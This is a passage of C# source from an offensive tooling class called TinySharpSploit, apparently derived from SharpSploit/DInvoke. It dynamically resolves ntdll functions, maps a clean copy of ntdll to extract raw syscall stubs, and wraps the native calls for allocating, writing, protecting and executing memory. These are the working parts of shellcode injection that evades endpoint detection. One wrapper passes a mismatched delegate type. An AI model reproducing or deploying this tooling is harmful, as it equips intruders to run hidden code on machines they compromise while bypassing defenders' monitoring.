            public struct IMAGE_FILE_HEADER
            {
                public ushort Machine;

                public ushort NumberOfSections;

                public uint TimeDateStamp;

                public uint PointerToSymbolTable;

                public uint NumberOfSymbols;

                public ushort SizeOfOptionalHeader;

                public ushort Characteristics;
            }

            [Flags]
            public enum DataSectionFlags : uint
            {
                TYPE_NO_PAD = 0x8u,
                CNT_CODE = 0x20u,
                CNT_INITIALIZED_DATA = 0x40u,
                CNT_UNINITIALIZED_DATA = 0x80u,
                LNK_INFO = 0x200u,
                LNK_REMOVE = 0x800u,
                LNK_COMDAT = 0x1000u,
                NO_DEFER_SPEC_EXC = 0x4000u,
                GPREL = 0x8000u,
                MEM_FARDATA = 0x8000u,
                MEM_PURGEABLE = 0x20000u,
                MEM_16BIT = 0x20000u,
                MEM_LOCKED = 0x40000u,
                MEM_PRELOAD = 0x80000u,
                ALIGN_1BYTES = 0x100000u,
                ALIGN_2BYTES = 0x200000u,
                ALIGN_4BYTES = 0x300000u,
                ALIGN_8BYTES = 0x400000u,
                ALIGN_16BYTES = 0x500000u,
                ALIGN_32BYTES = 0x600000u,
                ALIGN_64BYTES = 0x700000u,
                ALIGN_128BYTES = 0x800000u,
                ALIGN_256BYTES = 0x900000u,
                ALIGN_512BYTES = 0xA00000u,
                ALIGN_1024BYTES = 0xB00000u,
                ALIGN_2048BYTES = 0xC00000u,
                ALIGN_4096BYTES = 0xD00000u,
                ALIGN_8192BYTES = 0xE00000u,
                ALIGN_MASK = 0xF00000u,
                LNK_NRELOC_OVFL = 0x1000000u,
                MEM_DISCARDABLE = 0x2000000u,
                MEM_NOT_CACHED = 0x4000000u,
                MEM_NOT_PAGED = 0x8000000u,
                MEM_SHARED = 0x10000000u,
                MEM_EXECUTE = 0x20000000u,
                MEM_READ = 0x40000000u,
                MEM_WRITE = 0x80000000u
            }

            [StructLayout(LayoutKind.Explicit)]
            public struct IMAGE_SECTION_HEADER
            {
                [FieldOffset(0)]
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
                public char[] Name;

                [FieldOffset(8)]
                public uint VirtualSize;

                [FieldOffset(12)]
                public uint VirtualAddress;

                [FieldOffset(16)]
                public uint SizeOfRawData;

                [FieldOffset(20)]
                public uint PointerToRawData;

                [FieldOffset(24)]
                public uint PointerToRelocations;

                [FieldOffset(28)]
                public uint PointerToLinenumbers;

                [FieldOffset(32)]
                public ushort NumberOfRelocations;

                [FieldOffset(34)]
                public ushort NumberOfLinenumbers;

                [FieldOffset(36)]
                public DataSectionFlags Characteristics;

                public string Section => new string(Name);
            }

            [Flags]
            public enum ACCESS_MASK : uint
            {
                DELETE = 0x00010000,
                READ_CONTROL = 0x00020000,
                WRITE_DAC = 0x00040000,
                WRITE_OWNER = 0x00080000,
                SYNCHRONIZE = 0x00100000,
                STANDARD_RIGHTS_REQUIRED = 0x000F0000,
                STANDARD_RIGHTS_READ = 0x00020000,
                STANDARD_RIGHTS_WRITE = 0x00020000,
                STANDARD_RIGHTS_EXECUTE = 0x00020000,
                STANDARD_RIGHTS_ALL = 0x001F0000,
                SPECIFIC_RIGHTS_ALL = 0x0000FFF,
                ACCESS_SYSTEM_SECURITY = 0x01000000,
                MAXIMUM_ALLOWED = 0x02000000,
                GENERIC_READ = 0x80000000,
                GENERIC_WRITE = 0x40000000,
                GENERIC_EXECUTE = 0x20000000,
                GENERIC_ALL = 0x10000000,
                DESKTOP_READOBJECTS = 0x00000001,
                DESKTOP_CREATEWINDOW = 0x00000002,
                DESKTOP_CREATEMENU = 0x00000004,
                DESKTOP_HOOKCONTROL = 0x00000008,
                DESKTOP_JOURNALRECORD = 0x00000010,
                DESKTOP_JOURNALPLAYBACK = 0x00000020,
                DESKTOP_ENUMERATE = 0x00000040,
                DESKTOP_WRITEOBJECTS = 0x00000080,
                DESKTOP_SWITCHDESKTOP = 0x00000100,
                WINSTA_ENUMDESKTOPS = 0x00000001,
                WINSTA_READATTRIBUTES = 0x00000002,
                WINSTA_ACCESSCLIPBOARD = 0x00000004,
                WINSTA_CREATEDESKTOP = 0x00000008,
                WINSTA_WRITEATTRIBUTES = 0x00000010,
                WINSTA_ACCESSGLOBALATOMS = 0x00000020,
                WINSTA_EXITWINDOWS = 0x00000040,
                WINSTA_ENUMERATE = 0x00000100,
                WINSTA_READSCREEN = 0x00000200,
                WINSTA_ALL_ACCESS = 0x0000037F,

                SECTION_ALL_ACCESS = 0x10000000,
                SECTION_QUERY = 0x0001,
                SECTION_MAP_WRITE = 0x0002,
                SECTION_MAP_READ = 0x0004,
                SECTION_MAP_EXECUTE = 0x0008,
                SECTION_EXTEND_SIZE = 0x0010
            };

            [Flags]
            public enum ProcessAccessFlags : uint
            {
                PROCESS_ALL_ACCESS = 0x1F0FFFu,
                PROCESS_CREATE_PROCESS = 0x80u,
                PROCESS_CREATE_THREAD = 0x2u,
                PROCESS_DUP_HANDLE = 0x40u,
                PROCESS_QUERY_INFORMATION = 0x400u,
                PROCESS_QUERY_LIMITED_INFORMATION = 0x1000u,
                PROCESS_SET_INFORMATION = 0x200u,
                PROCESS_SET_QUOTA = 0x100u,
                PROCESS_SUSPEND_RESUME = 0x800u,
                PROCESS_TERMINATE = 0x1u,
                PROCESS_VM_OPERATION = 0x8u,
                PROCESS_VM_READ = 0x10u,
                PROCESS_VM_WRITE = 0x20u,
                SYNCHRONIZE = 0x100000u
            }

            public struct CLIENT_ID
            {
                public IntPtr UniqueProcess;

                public IntPtr UniqueThread;
            }


        }

    public class TinySharpSploit
    {
        public static void NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint FreeType)
        {
            object[] Parameters = new object[4] { ProcessHandle, BaseAddress, RegionSize, FreeType };
            switch ((STRUCTS.NTSTATUS)TinySharpSploit.DynamicAPIInvoke("ntdll.dll", "NtFreeVirtualMemory", typeof(DELEGATES.NtFreeVirtualMemory), ref Parameters))
            {
                case STRUCTS.NTSTATUS.AccessDenied:
                    throw new UnauthorizedAccessException("Access is denied.");
                case STRUCTS.NTSTATUS.InvalidHandle:
                    throw new InvalidOperationException("An invalid HANDLE was specified.");
                default:
                    throw new InvalidOperationException("There is a mismatch between the type of object that is required by the requested operation and the type of object that is specified in the request.");
                case STRUCTS.NTSTATUS.Success:
                    break;
            }
        }
        public static uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect)
        {
            uint num = 0u;
            object[] Parameters = new object[5] { ProcessHandle, BaseAddress, RegionSize, NewProtect, num };
            STRUCTS.NTSTATUS nTSTATUS = (STRUCTS.NTSTATUS)TinySharpSploit.DynamicAPIInvoke("ntdll.dll", "NtProtectVirtualMemory", typeof(DELEGATES.NtProtectVirtualMemory), ref Parameters);
            if (nTSTATUS != 0)
            {
                throw new InvalidOperationException("Failed to change memory protection, " + nTSTATUS);
            }

            return (uint)Parameters[4];
        }

        public static uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint BufferLength)
        {
            uint num = 0u;
            object[] Parameters = new object[5] { ProcessHandle, BaseAddress, Buffer, BufferLength, num };
            STRUCTS.NTSTATUS nTSTATUS = (STRUCTS.NTSTATUS)TinySharpSploit.DynamicAPIInvoke("ntdll.dll", "NtWriteVirtualMemory", typeof(DELEGATES.NtWriteVirtualMemory), ref Parameters);
            if (nTSTATUS != 0)
            {
                throw new InvalidOperationException("Failed to write memory, " + nTSTATUS);
            }

            return (uint)Parameters[4];
        }
        public static bool NtQueryInformationProcessWow64Information(IntPtr hProcess)
        {
            if (NtQueryInformationProcess(hProcess, STRUCTS.PROCESSINFOCLASS.ProcessWow64Information, out var pProcInfo) != 0)
            {
                throw new UnauthorizedAccessException("Access is denied.");
            }

            if (Marshal.ReadIntPtr(pProcInfo) == IntPtr.Zero)
            {
                return false;
            }

            return true;
        }

        public static void RtlZeroMemory(IntPtr Destination, int Length)
        {
            object[] Parameters = new object[2] { Destination, Length };
            TinySharpSploit.DynamicAPIInvoke("ntdll.dll", "RtlZeroMemory", typeof(DELEGATES.RtlZeroMemory), ref Parameters);
        }


        public static STRUCTS.NTSTATUS NtQueryInformationProcess(IntPtr hProcess, STRUCTS.PROCESSINFOCLASS processInfoClass, out IntPtr pProcInfo)
        {
            uint num = 0u;
            int num2;
            switch (processInfoClass)
            {
                case STRUCTS.PROCESSINFOCLASS.ProcessWow64Information:
                    pProcInfo = Marshal.AllocHGlobal(IntPtr.Size);
                    RtlZeroMemory(pProcInfo, IntPtr.Size);
                    num2 = IntPtr.Size;
                    break;
                case STRUCTS.PROCESSINFOCLASS.ProcessBasicInformation:
                    {
                        STRUCTS.PROCESS_BASIC_INFORMATION structure = default(STRUCTS.PROCESS_BASIC_INFORMATION);
                        pProcInfo = Marshal.AllocHGlobal(Marshal.SizeOf(structure));
                        RtlZeroMemory(pProcInfo, Marshal.SizeOf(structure));
                        Marshal.StructureToPtr(structure, pProcInfo, fDeleteOld: true);
                        num2 = Marshal.SizeOf(structure);
                        break;
                    }
                default:
                    throw new InvalidOperationException($"Invalid ProcessInfoClass: {processInfoClass}");
            }

            object[] Parameters = new object[5] { hProcess, processInfoClass, pProcInfo, num2, num };
            STRUCTS.NTSTATUS num3 = (STRUCTS.NTSTATUS)TinySharpSploit.DynamicAPIInvoke("ntdll.dll", "NtQueryInformationProcess", typeof(DELEGATES.NtQueryInformationProcess), ref Parameters);
            if (num3 != 0)
            {
                throw new UnauthorizedAccessException("Access is denied.");
            }

            pProcInfo = (IntPtr)Parameters[2];
            return num3;


        }

        public static IntPtr AllocateFileToMemory(string FilePath)
        {
            if (!File.Exists(FilePath))
            {
                throw new InvalidOperationException("Filepath not found.");
            }

            return AllocateBytesToMemory(File.ReadAllBytes(FilePath));
        }

        public static IntPtr AllocateBytesToMemory(byte[] FileByteArray)
        {
            IntPtr intPtr = Marshal.AllocHGlobal(FileByteArray.Length);
            Marshal.Copy(FileByteArray, 0, intPtr, FileByteArray.Length);
            return intPtr;
        }
        public static STRUCTS.NTSTATUS LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref STRUCTS.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle)
        {
            // Craft an array for the arguments
            object[] funcargs =
            {
                PathToFile, dwFlags, ModuleFileName, ModuleHandle
            };

            STRUCTS.NTSTATUS retValue = (STRUCTS.NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"LdrLoadDll", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);

            // Update the modified variables
            ModuleHandle = (IntPtr)funcargs[3];

            return retValue;
        }

        public static void RtlInitUnicodeString(ref STRUCTS.UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString)
        {
            // Craft an array for the arguments
            object[] funcargs =
            {
                DestinationString, SourceString
            };

            DynamicAPIInvoke(@"ntdll.dll", @"RtlInitUnicodeString", typeof(DELEGATES.RtlInitUnicodeString), ref funcargs);

            // Update the modified variables
            DestinationString = (STRUCTS.UNICODE_STRING)funcargs[0];
        }

        /// <summary>
        /// Dynamically invoke an arbitrary function from a DLL, providing its name, function prototype, and arguments.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="DLLName">Name of the DLL.</param>
        /// <param name="FunctionName">Name of the function.</param>
        /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
        /// <param name="Parameters">Parameters to pass to the function. Can be modified if function uses call by reference.</param>
        /// <returns>Object returned by the function. Must be unmarshalled by the caller.</returns>
        public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters)
        {
            IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
            return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
        }

        /// <summary>
        /// Dynamically invokes an arbitrary function from a pointer. Useful for manually mapped modules or loading/invoking unmanaged code from memory.
        /// </summary>
        /// <author>The Wover (@TheRealWover)</author>
        /// <param name="FunctionPointer">A pointer to the unmanaged function.</param>
        /// <param name="FunctionDelegateType">Prototype for the function, represented as a Delegate object.</param>
        /// <param name="Parameters">Arbitrary set of parameters to pass to the function. Can be modified if function uses call by reference.</param>
        /// <returns>Object returned by the function. Must be unmarshalled by the caller.</returns>
        public static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters)
        {
            Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
            return funcDelegate.DynamicInvoke(Parameters);
        }


        /// <summary>
        /// Resolves LdrLoadDll and uses that function to load a DLL from disk.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLPath">The path to the DLL on disk. Uses the LoadLibrary convention.</param>
        /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module was not loaded successfully.</returns>
        public static IntPtr LoadModuleFromDisk(string DLLPath)
        {
            STRUCTS.UNICODE_STRING uModuleName = new STRUCTS.UNICODE_STRING();
            RtlInitUnicodeString(ref uModuleName, DLLPath);

            IntPtr hModule = IntPtr.Zero;
            STRUCTS.NTSTATUS CallResult = LdrLoadDll(IntPtr.Zero, 0, ref uModuleName, ref hModule);
            if (CallResult != STRUCTS.NTSTATUS.Success || hModule == IntPtr.Zero)
            {
                return IntPtr.Zero;
            }

            return hModule;
        }

        /// <summary>
        /// Helper for getting the base address of a module loaded by the current process. This base
        /// address could be passed to GetProcAddress/LdrGetProcedureAddress or it could be used for
        /// manual export parsing. This function uses the .NET System.Diagnostics.Process class.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll").</param>
        /// <returns>IntPtr base address of the loaded module or IntPtr.Zero if the module is not found.</returns>
        public static IntPtr GetLoadedModuleAddress(string DLLName)
        {
            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
            foreach (ProcessModule Mod in ProcModules)
            {
                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
                {
                    return Mod.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }




        /// <summary>
        /// Helper for getting the pointer to a function from a DLL loaded by the process.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="DLLName">The name of the DLL (e.g. "ntdll.dll" or "C:\Windows\System32\ntdll.dll").</param>
        /// <param name="FunctionName">Name of the exported procedure.</param>
        /// <param name="CanLoadFromDisk">Optional, indicates if the function can try to load the DLL from disk if it is not found in the loaded module list.</param>
        /// <returns>IntPtr for the desired function.</returns>
        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = true)
        {
            IntPtr hModule = GetLoadedModuleAddress(DLLName);
            if (hModule == IntPtr.Zero && CanLoadFromDisk)
            {
                hModule = LoadModuleFromDisk(DLLName);
                if (hModule == IntPtr.Zero)
                {
                    throw new FileNotFoundException(DLLName + ", unable to find the specified file.");
                }
            }
            else if (hModule == IntPtr.Zero)
            {
                throw new DllNotFoundException(DLLName + ", Dll was not found.");
            }

            return GetExportAddress(hModule, FunctionName);
        }





        /// <summary>
        /// Given a module base address, resolve the address of a function by manually walking the module export table.
        /// </summary>
        /// <author>Ruben Boonen (@FuzzySec)</author>
        /// <param name="ModuleBase">A pointer to the base address where the module is loaded in the current process.</param>
        /// <param name="ExportName">The name of the export to search for (e.g. "NtAlertResumeThread").</param>
        /// <returns>IntPtr for the desired function.</returns>
        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
        {
            IntPtr FunctionPtr = IntPtr.Zero;
            try
            {
                // Traverse the PE header in memory
                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
                Int64 pExport = 0;
                if (Magic == 0x010b)
                {
                    pExport = OptHeader + 0x60;
                }
                else
                {
                    pExport = OptHeader + 0x70;
                }

                // Read -> IMAGE_EXPORT_DIRECTORY
                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));

                // Loop the array of export name RVA's
                for (int i = 0; i < NumberOfNames; i++)
                {
                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
                    {
                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
                        break;
                    }
                }
            }
            catch
            {
                // Catch parser failure
                throw new InvalidOperationException("Failed to parse module exports.");
            }

            if (FunctionPtr == IntPtr.Zero)
            {
                // Export not found
                throw new MissingMethodException(ExportName + ", export not found.");
            }
            return FunctionPtr;
        }


        public static IntPtr GetSyscallStub(string FunctionName)
        {
            bool flag = TinySharpSploit.NtQueryInformationProcessWow64Information((IntPtr)(-1));
            ProcessModule processModule = null;
            string filePath = string.Empty;
            foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
            {
                if (module.FileName.EndsWith("ntdll.dll", StringComparison.OrdinalIgnoreCase))
                {
                    filePath = module.FileName;
                }
            }

            foreach (ProcessModule module2 in Process.GetCurrentProcess().Modules)
            {
                if (module2.FileName.EndsWith("ntdll.dll", StringComparison.OrdinalIgnoreCase))
                {
                    processModule = module2;
                    filePath = processModule.FileName;
                }
            }

            IntPtr intPtr = TinySharpSploit.AllocateFileToMemory(filePath);
            STRUCTS.PE_META_DATA peMetaData = GetPeMetaData(intPtr);
            IntPtr BaseAddress = IntPtr.Zero;
            IntPtr RegionSize = (peMetaData.Is32Bit ? ((IntPtr)peMetaData.OptHeader32.SizeOfImage) : ((IntPtr)peMetaData.OptHeader64.SizeOfImage));
            uint bufferLength = (peMetaData.Is32Bit ? peMetaData.OptHeader32.SizeOfHeaders : peMetaData.OptHeader64.SizeOfHeaders);
            IntPtr BaseAddress2 = TinySharpSploit.NtAllocateVirtualMemory((IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize, STRUCTS.MEM_COMMIT | STRUCTS.MEM_RESERVE, 4u);
            TinySharpSploit.NtWriteVirtualMemory((IntPtr)(-1), BaseAddress2, intPtr, bufferLength);
            STRUCTS.IMAGE_SECTION_HEADER[] sections = peMetaData.Sections;
            for (int i = 0; i < sections.Length; i++)
            {
                STRUCTS.IMAGE_SECTION_HEADER iMAGE_SECTION_HEADER = sections[i];
                IntPtr baseAddress = (IntPtr)((long)BaseAddress2 + iMAGE_SECTION_HEADER.VirtualAddress);
                IntPtr buffer = (IntPtr)((long)intPtr + iMAGE_SECTION_HEADER.PointerToRawData);
                if (TinySharpSploit.NtWriteVirtualMemory((IntPtr)(-1), baseAddress, buffer, iMAGE_SECTION_HEADER.SizeOfRawData) != iMAGE_SECTION_HEADER.SizeOfRawData)
                {
                    throw new InvalidOperationException("Failed to write to memory.");
                }
            }

            IntPtr exportAddress = GetExportAddress(BaseAddress2, FunctionName);
            if (exportAddress == IntPtr.Zero)
            {
                throw new InvalidOperationException("Failed to resolve ntdll export.");
            }

            BaseAddress = IntPtr.Zero;
            RegionSize = (IntPtr)80;
            IntPtr BaseAddress3 = TinySharpSploit.NtAllocateVirtualMemory((IntPtr)(-1), ref BaseAddress, IntPtr.Zero, ref RegionSize, STRUCTS.MEM_COMMIT | STRUCTS.MEM_RESERVE, 4u);
            if (TinySharpSploit.NtWriteVirtualMemory((IntPtr)(-1), BaseAddress3, exportAddress, 80u) != 80)
            {
                throw new InvalidOperationException("Failed to write to memory.");
            }

            if (IntPtr.Size == 4 && flag)
            {
                IntPtr exportAddress2 = GetExportAddress(processModule.BaseAddress, "Wow64Transition");
                byte val = Marshal.ReadByte(BaseAddress3, 13);
                Marshal.WriteByte(BaseAddress3, 5, byte.MaxValue);
                Marshal.WriteByte(BaseAddress3, 6, 21);
                Marshal.WriteInt32(BaseAddress3, 7, exportAddress2.ToInt32());
                Marshal.WriteByte(BaseAddress3, 11, 194);
                Marshal.WriteByte(BaseAddress3, 12, val);
                Marshal.WriteByte(BaseAddress3, 13, 0);
                Marshal.WriteByte(BaseAddress3, 14, 144);
                Marshal.WriteByte(BaseAddress3, 15, 144);
            }

            TinySharpSploit.NtProtectVirtualMemory((IntPtr)(-1), ref BaseAddress3, ref RegionSize, 32u);
            Marshal.FreeHGlobal(intPtr);
            RegionSize = (peMetaData.Is32Bit ? ((IntPtr)peMetaData.OptHeader32.SizeOfImage) : ((IntPtr)peMetaData.OptHeader64.SizeOfImage));
            TinySharpSploit.NtFreeVirtualMemory((IntPtr)(-1), ref BaseAddress2, ref RegionSize, STRUCTS.MEM_RELEASE);
            return BaseAddress3;
        }



        public static STRUCTS.PE_META_DATA GetPeMetaData(IntPtr pModule)
        {
            STRUCTS.PE_META_DATA result = default(STRUCTS.PE_META_DATA);
            try
            {
                uint num = (uint)Marshal.ReadInt32((IntPtr)((long)pModule + 60));
                result.Pe = (uint)Marshal.ReadInt32((IntPtr)((long)pModule + num));
                if (result.Pe != 17744)
                {
                    throw new InvalidOperationException("Invalid PE signature.");
                }

                result.ImageFileHeader = (STRUCTS.IMAGE_FILE_HEADER)Marshal.PtrToStructure((IntPtr)((long)pModule + num + 4), typeof(STRUCTS.IMAGE_FILE_HEADER));
                IntPtr intPtr = (IntPtr)((long)pModule + num + 24);
                switch ((ushort)Marshal.ReadInt16(intPtr))
                {
                    case 267:
                        result.Is32Bit = true;
                        result.OptHeader32 = (STRUCTS.IMAGE_OPTIONAL_HEADER32)Marshal.PtrToStructure(intPtr, typeof(STRUCTS.IMAGE_OPTIONAL_HEADER32));
                        break;
                    case 523:
                        result.Is32Bit = false;
                        result.OptHeader64 = (STRUCTS.IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(intPtr, typeof(STRUCTS.IMAGE_OPTIONAL_HEADER64));
                        break;
                    default:
                        throw new InvalidOperationException("Invalid magic value (PE32/PE32+).");
                }

                STRUCTS.IMAGE_SECTION_HEADER[] array = new STRUCTS.IMAGE_SECTION_HEADER[result.ImageFileHeader.NumberOfSections];
                for (int i = 0; i < result.ImageFileHeader.NumberOfSections; i++)
                {
                    IntPtr ptr = (IntPtr)((long)intPtr + result.ImageFileHeader.SizeOfOptionalHeader + (uint)(i * 40));
                    array[i] = (STRUCTS.IMAGE_SECTION_HEADER)Marshal.PtrToStructure(ptr, typeof(STRUCTS.IMAGE_SECTION_HEADER));
                }

                result.Sections = array;
                return result;
            }
            catch
            {
                throw new InvalidOperationException("Invalid module base specified.");
            }
        }



        public static STRUCTS.NTSTATUS NtCreateThreadEx(ref IntPtr threadHandle, STRUCTS.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList)
        {
            object[] Parameters = new object[11]
            {
                threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, parameter, createSuspended, stackZeroBits, sizeOfStack, maximumStackSize,
                attributeList
            };
            STRUCTS.NTSTATUS result = (STRUCTS.NTSTATUS)TinySharpSploit.DynamicAPIInvoke("ntdll.dll", "NtCreateThreadEx", typeof(DELEGATES.NtCreateThreadEx), ref Parameters);
            threadHandle = (IntPtr)Parameters[0];
            return result;
        }


        public static IntPtr NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect)
        {
            object[] Parameters = new object[6] { ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect };
            switch ((STRUCTS.NTSTATUS)TinySharpSploit.DynamicAPIInvoke("ntdll.dll", "NtAllocateVirtualMemory", typeof(DELEGATES.NtAllocateVirtualMemory), ref Parameters))
            {
                case STRUCTS.NTSTATUS.AccessDenied:
                    throw new UnauthorizedAccessException("Access is denied.");
                case STRUCTS.NTSTATUS.AlreadyCommitted:
                    throw new InvalidOperationException("The specified address range is already committed.");
                case STRUCTS.NTSTATUS.CommitmentLimit:
                    throw new InvalidOperationException("Your system is low on virtual memory.");
                case STRUCTS.NTSTATUS.ConflictingAddresses:
                    throw new InvalidOperationException("The specified address range conflicts with the address space.");
                case STRUCTS.NTSTATUS.InsufficientResources:
                    throw new InvalidOperationException("Insufficient system resources exist to complete the API call.");
                case STRUCTS.NTSTATUS.InvalidHandle:
                    throw new InvalidOperationException("An invalid HANDLE was specified.");
                case STRUCTS.NTSTATUS.InvalidPageProtection:
                    throw new InvalidOperationException("The specified page protection was not valid.");
                case STRUCTS.NTSTATUS.NoMemory:
                    throw new InvalidOperationException("Not enough virtual memory or paging file quota is available to complete the specified operation.");
                case STRUCTS.NTSTATUS.ObjectTypeMismatch:
                    throw new InvalidOperationException("There is a mismatch between the type of object that is required by the requested operation and the type of object that is specified in the request.");
                default:
                    throw new InvalidOperationException("An attempt was made to duplicate an object handle into or out of an exiting process.");
                case STRUCTS.NTSTATUS.Success:
                    BaseAddress = (IntPtr)Parameters[1];
                    return BaseAddress;
            }
        }












    }
}






